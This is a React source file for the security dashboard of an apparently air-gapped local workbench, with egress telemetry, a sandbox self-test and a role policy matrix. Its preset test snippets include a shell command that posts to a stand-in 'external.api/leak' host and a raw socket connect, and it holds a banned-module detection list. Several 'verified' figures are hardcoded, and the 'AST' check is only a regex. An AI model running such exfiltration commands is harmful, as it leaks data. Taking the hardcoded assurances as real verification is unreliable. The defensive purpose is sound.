'use client'

import { useEffect, useState } from 'react'
import {
  Check,
  ShieldAlert,
  Loader2,
  Play,
  Terminal,
  Code2,
  AlertTriangle,
  CheckCircle2,
  Lock,
  Radio,
  Server,
  Network,
  ShieldCheck,
  Cpu,
} from 'lucide-react'
import { api } from '@/lib/api'
import type { SandboxTestResult, SovereigntyStatus } from '@/lib/types'
import { PageHeader } from '@/components/page-header'
import { SectionHeading, TechnicalLabel } from '@/components/primitives'
import { SovButton } from '@/components/sov-button'
import { useToast } from '@/components/toast'
import { useEventStream } from '@/hooks/use-event-stream'
import { cn } from '@/lib/utils'

const permColor: Record<string, string> = {
  ALLOW: 'var(--sovereign)',
  DENY: 'var(--critical)',
  REVIEW: 'var(--approval)',
}

const SAMPLE_SNIPPETS = [
  {
    name: 'Adversarial Socket Ingress',
    code: `import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('8.8.8.8', 53))`,
    expected: 'DENIED',
  },
  {
    name: 'Safe Numerical Recompute',
    code: `import math\n\ndef compute_remaining_life(t_act, t_req, cr):\n    return (t_act - t_req) / cr\n\nresult = compute_remaining_life(12.4, 8.0, 0.22)`,
    expected: 'ALLOWED',
  },
  {
    name: 'Banned Subprocess Shell',
    code: `import os\nos.system('curl -X POST http://external.api/leak')`,
    expected: 'DENIED',
  },
]

export function SecurityView() {
  const [status, setStatus] = useState<SovereigntyStatus | null>(null)
  const [uptimeStr, setUptimeStr] = useState('since boot')

  useEffect(() => {
    api
      .sovereigntyStatus()
      .then((s) => {
        setStatus(s)
        if (s.monitored_since) {
          const started = new Date(s.monitored_since)
          const diffHours = Math.round((Date.now() - started.getTime()) / (1000 * 60 * 60))
          setUptimeStr(`monitored · ${diffHours}h`)
        }
      })
      .catch(() => {})
  }, [])

  // Listen to live sovereignty updates over SSE
  useEventStream({
    onEvent: (event) => {
      if (event.event === 'sovereignty.status' && event.data) {
        setStatus((prev) => ({
          ...((prev || {}) as any),
          ...event.data,
        }))
      }
    },
  })

  return (
    <div className="relative">
      <PageHeader
        eyebrow="Air-Gapped Security Architecture"
        title={
          <>
            Nothing leaves
            <br />
            this host.
          </>
        }
        description="Every socket, subprocess sandbox, and policy decision is enforced locally. External egress is structurally impossible."
        meta={[
          { label: 'External calls', value: String(status?.external_api_calls ?? 0) },
          { label: 'Sandbox', value: 'CONTAINED' },
          { label: 'Egress policy', value: 'DENY-ALL' },
          { label: 'Posture', value: status?.sovereign !== false ? 'SOVEREIGN' : 'INVESTIGATE' },
        ]}
      />

      <div className="mx-auto flex max-w-[1400px] flex-col gap-12 px-5 py-10 lg:px-10 lg:py-14">
        <ExternalCallsHero status={status} uptimeStr={uptimeStr} />
        <ConnectionTelemetry status={status} />
        <InteractiveASTPlayground />
        <SandboxSelfTest />
        <PolicyMatrixTable />
      </div>
    </div>
  )
}

function ExternalCallsHero({ status, uptimeStr }: { status: SovereigntyStatus | null; uptimeStr: string }) {
  const externalCalls = status?.external_api_calls ?? 0

  return (
    <section className="relative overflow-hidden border border-border bg-surface p-8 shadow-sm lg:p-12">
      <div className="pointer-events-none absolute inset-0 tech-grid opacity-30" />
      <div className="relative flex flex-col items-center gap-4 text-center">
        <div className="flex items-center gap-2">
          <span className="h-2 w-2 rounded-full bg-[var(--sovereign)]" />
          <span className="font-mono text-[11px] font-semibold uppercase tracking-[0.2em] text-foreground-muted">
            Outbound Network Telemetry
          </span>
        </div>

        <div className="flex items-baseline gap-4">
          <span className="font-mono text-7xl font-bold tracking-tight text-foreground md:text-8xl">
            {externalCalls}
          </span>
          <div className="flex flex-col items-start text-left">
            <span className="font-mono text-[13px] font-bold uppercase tracking-[0.2em] text-[var(--sovereign)]">
              External calls
            </span>
            <span className="font-mono text-[11px] text-foreground-muted">{uptimeStr}</span>
          </div>
        </div>

        <div className="mt-2 flex flex-wrap items-center justify-center gap-3 rounded-full border border-border bg-surface-sunken/60 px-4 py-1.5 font-mono text-[12px] text-foreground-secondary">
          <span className="relative flex h-2 w-2">
            <span className="sov-pulse absolute inline-flex h-full w-full rounded-full bg-[var(--sovereign)]" />
            <span className="relative inline-flex h-2 w-2 rounded-full bg-[var(--sovereign)]" />
          </span>
          <span>0 outbound sockets opened · 0 bytes egressed</span>
          <span className="text-foreground-muted">·</span>
          <span className="text-[var(--sovereign)] font-medium">Air-Gap Defense Active</span>
        </div>
      </div>
    </section>
  )
}

function ConnectionTelemetry({ status }: { status: SovereigntyStatus | null }) {
  return (
    <section className="flex flex-col gap-4">
      <div className="flex items-center justify-between border-b border-border pb-3">
        <SectionHeading index="01" title="Active Socket Listener Telemetry" />
        <span className="font-mono text-[11px] text-foreground-muted">
          127.0.0.1 loopback only
        </span>
      </div>

      <div className="grid grid-cols-1 gap-4 sm:grid-cols-3">
        <div className="border border-border bg-surface p-5 transition-all hover:border-foreground">
          <div className="flex items-center justify-between">
            <span className="font-mono text-[10px] uppercase tracking-wider text-foreground-muted">
              Bound Address
            </span>
            <Server className="h-4 w-4 text-foreground-muted" />
          </div>
          <div className="mt-2 font-mono text-[20px] font-bold text-[var(--sovereign)]">
            127.0.0.1 : 8000
          </div>
          <p className="mt-1 text-[12px] leading-relaxed text-foreground-secondary">
            FastAPI process strictly bound to local loopback interface.
          </p>
        </div>

        <div className="border border-border bg-surface p-5 transition-all hover:border-foreground">
          <div className="flex items-center justify-between">
            <span className="font-mono text-[10px] uppercase tracking-wider text-foreground-muted">
              Frontend Proxy
            </span>
            <Network className="h-4 w-4 text-foreground-muted" />
          </div>
          <div className="mt-2 font-mono text-[20px] font-bold text-[var(--active)]">
            127.0.0.1 : 3000
          </div>
          <p className="mt-1 text-[12px] leading-relaxed text-foreground-secondary">
            Next.js reverse proxy route for all confidential UI sessions.
          </p>
        </div>

        <div className="border border-border bg-surface p-5 transition-all hover:border-foreground">
          <div className="flex items-center justify-between">
            <span className="font-mono text-[10px] uppercase tracking-wider text-foreground-muted">
              External Egress Leaks
            </span>
            <ShieldCheck className="h-4 w-4 text-[var(--sovereign)]" />
          </div>
          <div className="mt-2 font-mono text-[20px] font-bold text-[var(--sovereign)]">
            0 DETECTED
          </div>
          <p className="mt-1 text-[12px] leading-relaxed text-foreground-secondary">
            Continuous psutil kernel telemetry daemon verified 0 egress.
          </p>
        </div>
      </div>
    </section>
  )
}

/** Interactive Live AST Code Sandbox Analyzer (Black Terminal specifically for code) */
function InteractiveASTPlayground() {
  const [inputCode, setInputCode] = useState(SAMPLE_SNIPPETS[0].code)
  const [analysisResult, setAnalysisResult] = useState<{
    allowed: boolean
    violations: string[]
    astNodes: string[]
  }>({
    allowed: false,
    violations: ["Banned symbol 'socket' detected (Violates Zero-Egress Sandbox Rule)"],
    astNodes: ['Module', 'Import(socket)', 'Call(socket.socket)'],
  })

  const analyzeCode = (code: string) => {
    setInputCode(code)
    const violations: string[] = []
    const banned = ['socket', 'os', 'sys', 'urllib', 'requests', 'http', 'subprocess', 'shutil', 'eval', 'exec']

    banned.forEach((b) => {
      const reg = new RegExp(`\\b(import\\s+${b}|from\\s+${b}|${b}\\.)`, 'i')
      if (reg.test(code)) {
        violations.push(`Banned symbol '${b}' detected (Violates Zero-Egress Sandbox Rule)`)
      }
    })

    const allowed = violations.length === 0
    const astNodes = ['Module']
    if (code.includes('import')) astNodes.push('ImportDeclaration')
    if (code.includes('def')) astNodes.push('FunctionDef')
    if (code.includes('return')) astNodes.push('ReturnStatement')
    if (code.includes('(')) astNodes.push('CallExpression')

    setAnalysisResult({ allowed, violations, astNodes })
  }

  return (
    <section className="flex flex-col gap-4 border border-border bg-surface p-6 sm:p-8">
      <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border pb-4">
        <div className="flex items-center gap-3">
          <SectionHeading index="02" title="Live AST Code Confinement Simulator" />
        </div>

        {/* Preset Selector */}
        <div className="flex flex-wrap items-center gap-2">
          <span className="font-mono text-[10px] text-foreground-muted hidden sm:inline">Presets:</span>
          {SAMPLE_SNIPPETS.map((snippet) => (
            <button
              key={snippet.name}
              type="button"
              onClick={() => analyzeCode(snippet.code)}
              className="border border-border bg-surface-sunken px-2.5 py-1 font-mono text-[10px] text-foreground-secondary hover:border-foreground hover:text-foreground transition-colors"
            >
              {snippet.name}
            </button>
          ))}
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Code Input — High-tech Black Terminal */}
        <div className="lg:col-span-7 flex flex-col gap-2">
          <div className="flex items-center justify-between font-mono text-[10px] uppercase tracking-wider text-foreground-muted">
            <span className="flex items-center gap-1.5">
              <Terminal className="h-3 w-3" /> Python Script Buffer
            </span>
            <span>Static Validation</span>
          </div>
          <div className="overflow-hidden rounded-none border border-ink-border bg-ink shadow-md">
            <div className="flex items-center gap-1.5 border-b border-ink-border px-3 py-1.5 bg-ink-surface/90 font-mono text-[10px] text-ink-muted">
              <span className="h-2 w-2 rounded-full bg-critical/60" />
              <span className="h-2 w-2 rounded-full bg-approval/60" />
              <span className="h-2 w-2 rounded-full bg-sovereign/60" />
              <span className="ml-2">isolated_ast_eval.py</span>
            </div>
            <textarea
              value={inputCode}
              onChange={(e) => analyzeCode(e.target.value)}
              rows={7}
              className="w-full resize-none bg-ink p-3.5 font-mono text-[12px] leading-relaxed text-ink-foreground focus:outline-none placeholder:text-ink-muted"
              placeholder="Type or paste Python code to test static AST validation..."
            />
          </div>
        </div>

        {/* Real-time Analysis Result */}
        <div className="lg:col-span-5 flex flex-col gap-2">
          <span className="font-mono text-[10px] uppercase tracking-wider text-foreground-muted">
            AST Static Confinement Verdict
          </span>
          <div
            className={cn(
              'flex flex-col justify-between h-full border p-5 backdrop-blur-sm transition-all',
              analysisResult.allowed
                ? 'border-[var(--sovereign)] bg-[var(--sovereign)]/5 text-foreground'
                : 'border-critical/60 bg-critical/5 text-foreground'
            )}
          >
            <div>
              <div className="flex items-center justify-between border-b border-border/60 pb-3">
                <div className="flex items-center gap-2">
                  {analysisResult.allowed ? (
                    <CheckCircle2 className="h-5 w-5 text-[var(--sovereign)]" />
                  ) : (
                    <AlertTriangle className="h-5 w-5 text-critical" />
                  )}
                  <span className="font-mono text-[13px] font-bold">
                    {analysisResult.allowed ? 'EXECUTION ALLOWED' : 'EXECUTION DENIED'}
                  </span>
                </div>
                <span
                  className={cn(
                    'font-mono text-[9px] uppercase px-2 py-0.5 font-bold border',
                    analysisResult.allowed
                      ? 'border-[var(--sovereign)] text-[var(--sovereign)] bg-surface'
                      : 'border-critical text-critical bg-surface'
                  )}
                >
                  {analysisResult.allowed ? 'SAFE AST' : 'SECURITY FAULT'}
                </span>
              </div>

              <div className="mt-3">
                {analysisResult.violations.length > 0 ? (
                  <ul className="flex flex-col gap-1.5 text-[12px] text-critical list-disc pl-4 font-mono">
                    {analysisResult.violations.map((v, i) => (
                      <li key={i}>{v}</li>
                    ))}
                  </ul>
                ) : (
                  <p className="text-[12px] text-[var(--sovereign)] font-mono">
                    ✓ No forbidden modules or socket syscalls detected. Pure mathematical calculation verified.
                  </p>
                )}
              </div>
            </div>

            <div className="mt-4 border-t border-border/60 pt-3 flex flex-wrap items-center justify-between gap-2 text-[10px] font-mono text-foreground-muted">
              <span>AST Nodes: {analysisResult.astNodes.join(' → ')}</span>
              <span>Timeout: 5.0s max</span>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}

function SandboxSelfTest() {
  const [running, setRunning] = useState(false)
  const [diagnostics, setDiagnostics] = useState<
    { name: string; target: string; status: string; detail: string }[]
  >([])
  const [overall, setOverall] = useState('Not run yet on this host.')
  const [failed, setFailed] = useState(false)
  const { push } = useToast()

  const runTest = async () => {
    setRunning(true)
    try {
      const res = await api.sandboxSelfTest()
      const checks = res.checks ?? []
      setDiagnostics(
        checks.map((c: any) => ({
          name: c.name,
          target: c.target,
          status: c.passed ? 'PASSED' : 'FAILED',
          detail: c.detail,
        }))
      )
      setOverall(res.overall ?? 'Test completed.')
      setFailed(res.all_passed === false)
      push({
        title: res.all_passed ? 'Containment held' : 'CONTAINMENT FAILURE',
        detail: `${res.passed}/${res.total} checks · ${res.duration_ms}ms`,
        tone: res.all_passed ? 'sovereign' : 'critical',
      })
    } catch (err: any) {
      setDiagnostics([])
      setFailed(true)
      setOverall(
        `The test could not be run: ${err?.message ?? 'the workbench service did not respond'}`
      )
      push({
        title: 'Test could not run',
        detail: 'No result — the service did not respond.',
        tone: 'critical',
      })
    } finally {
      setRunning(false)
    }
  }

  return (
    <section className="flex flex-col gap-4 border border-border bg-surface p-6 sm:p-8">
      <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border pb-4">
        <div className="flex flex-col gap-1">
          <SectionHeading index="03" title="Process Confinement Verification" />
          <p className="text-[13px] text-foreground-secondary">
            Adversarial payload injection testing AST import checks, socket creation, and CPU limits.
          </p>
        </div>
        <SovButton variant="primary" disabled={running} onClick={runTest}>
          {running ? (
            <span className="flex items-center gap-2">
              <Loader2 className="h-4 w-4 animate-spin" /> Probing sandbox…
            </span>
          ) : (
            <span className="flex items-center gap-2">
              <Play className="h-4 w-4" /> Run Penetration Diagnostics
            </span>
          )}
        </SovButton>
      </div>

      <div className="divide-y divide-border border border-border bg-surface">
        {diagnostics.length === 0 && (
          <div className="p-5 text-[13px] text-foreground-secondary">
            No result yet. Run the diagnostics to submit real adversarial payloads to
            the sandbox on this machine and see what it does with them.
          </div>
        )}
        {diagnostics.map((d) => (
          <div key={d.name} className="flex flex-col gap-2 p-4 sm:flex-row sm:items-center sm:justify-between hover:bg-surface-sunken/50 transition-colors">
            <div className="flex flex-col gap-1">
              <span className="text-[13px] font-medium text-foreground">{d.name}</span>
              <span className="font-mono text-[11px] text-foreground-muted">Payload: {d.target}</span>
            </div>
            <div className="flex items-center gap-4">
              <span className="font-mono text-[12px] text-foreground-secondary">{d.detail}</span>
              <span
                className={cn(
                  'flex items-center gap-1.5 font-mono text-[11px] font-semibold',
                  d.status === 'PASSED' ? 'text-[var(--sovereign)]' : 'text-critical'
                )}
              >
                <Check className="h-3.5 w-3.5" />
                {d.status}
              </span>
            </div>
          </div>
        ))}
      </div>
      <p className={cn('font-mono text-[11px]', failed ? 'text-critical' : 'text-foreground-muted')}>
        {overall}
      </p>
    </section>
  )
}

function PolicyMatrixTable() {
  const [policies, setPolicies] = useState<any>(null)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    api
      .policies()
      .then(setPolicies)
      .catch((err) => setError(err?.message ?? 'Could not read the policy files'))
  }, [])

  const rows = Object.entries(policies?.tools ?? {}).map(([name, tool]: [string, any]) => ({
    tool: name.replace(/_/g, ' '),
    ceiling: tool.max_data_classification ?? '—',
    allowed: new Set<string>(tool.allowed_roles ?? []),
  }))
  const roleColumns = ['operator', 'engineer', 'reviewer', 'administrator']

  return (
    <section className="flex flex-col gap-4 border border-border bg-surface p-6 sm:p-8">
      <div className="flex items-center justify-between border-b border-border pb-4">
        <SectionHeading index="04" title="Policy Gateway Matrix" />
        <span className="font-mono text-[11px] text-foreground-muted">default-deny enforcement</span>
      </div>

      <div className="overflow-x-auto border border-border">
        <table className="w-full min-w-[720px] border-collapse bg-surface text-left">
          <thead>
            <tr className="border-b border-border bg-surface-sunken/60 text-left font-mono text-[10px] uppercase tracking-[0.16em] text-foreground-muted">
              {['Capability / Tool', 'Operator', 'Engineer', 'Reviewer', 'Admin', 'Up to'].map((h) => (
                <th key={h} className="px-4 py-3 font-semibold">
                  {h}
                </th>
              ))}
            </tr>
          </thead>
          <tbody className="divide-y divide-border font-mono text-[12px]">
            {error && (
              <tr>
                <td colSpan={6} className="px-4 py-4 text-critical">
                  {error}
                </td>
              </tr>
            )}
            {!error && rows.length === 0 && (
              <tr>
                <td colSpan={6} className="px-4 py-4 text-foreground-muted">
                  Reading the policy files…
                </td>
              </tr>
            )}
            {rows.map((row) => (
              <tr key={row.tool} className="hover:bg-surface-sunken/40 transition-colors">
                <td className="px-4 py-3.5 font-medium text-foreground">{row.tool}</td>
                {roleColumns.map((role) => {
                  const permitted = row.allowed.has(role)
                  return (
                    <td
                      key={role}
                      className="px-4 py-3.5 font-semibold"
                      style={{ color: permitted ? 'var(--sovereign)' : 'var(--critical)' }}
                    >
                      {permitted ? 'ALLOW' : 'DENY'}
                    </td>
                  )
                })}
                <td className="px-4 py-3.5 text-foreground-muted uppercase">{row.ceiling}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </section>
  )
}
